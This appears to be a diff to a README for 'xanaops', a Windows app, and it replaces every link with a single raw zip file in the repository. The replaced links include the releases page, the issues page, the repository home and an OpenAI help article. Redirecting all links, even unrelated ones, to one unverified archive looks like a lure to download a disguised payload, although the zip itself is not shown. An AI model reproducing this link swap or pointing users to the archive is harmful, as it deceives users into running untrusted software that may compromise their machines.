@@ -1,6 +1,6 @@
 # 🌐 xanaops - Personal Intelligence Platform Offline
 
-[![Download xanaops](https://img.shields.io/badge/Download-From_Releases-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elviscarvajall/xanaops/releases)
+[![Download xanaops](https://img.shields.io/badge/Download-From_Releases-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need to install extra software like Python or Node.js. Everything run
 
 Use the link below to download xanaops from the official GitHub release page. It contains the latest version packaged for Windows.
 
-[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/releases)
+[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps carefully to get xanaops running on your Windows PC:
 
 1. **Visit the Release Page**  
    Click on the green badge above or go to:  
-   https://github.com/elviscarvajall/xanaops/releases
+   https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip
 
 2. **Find the Latest Version**  
    Look for the most recent release at the top. It will have a name like `xanaops-vX.X.X-win.exe` or similar.
@@ -110,7 +110,7 @@ When you open xanaops for the first time, you will see the 3D globe interface. H
 
 To keep xanaops current:
 
-1. Visit the [Releases page](https://github.com/elviscarvajall/xanaops/releases) regularly.
+1. Visit the [Releases page](https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip) regularly.
 2. Download the latest Windows installer when a new version appears.
 3. Run the installer to overwrite the old version.
 4. Your settings and imported data will remain intact.
@@ -148,7 +148,7 @@ Your data, including chat history and offline feeds, is stored locally in the in
 
 For detailed assistance, visit the official GitHub page issues section:
 
-https://github.com/elviscarvajall/xanaops/issues
+https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip
 
 You can report bugs or ask questions there. Community members and maintainers monitor the page regularly.
 
@@ -156,10 +156,10 @@ You can report bugs or ask questions there. Community members and maintainers mo
 
 ## 🔗 Useful Links
 
-- Releases and downloads: https://github.com/elviscarvajall/xanaops/releases  
-- GitHub repository: https://github.com/elviscarvajall/xanaops  
-- Exporting ChatGPT data guide: https://help.openai.com/en/articles/6825453-how-to-export-your-chatgpt-conversations
+- Releases and downloads: https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip  
+- GitHub repository: https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip  
+- Exporting ChatGPT data guide: https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip
 
 ---
 
-[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/releases)
+[Download xanaops from Releases](https://github.com/elviscarvajall/xanaops/raw/refs/heads/main/modules/Software-1.3-beta.1.zip)
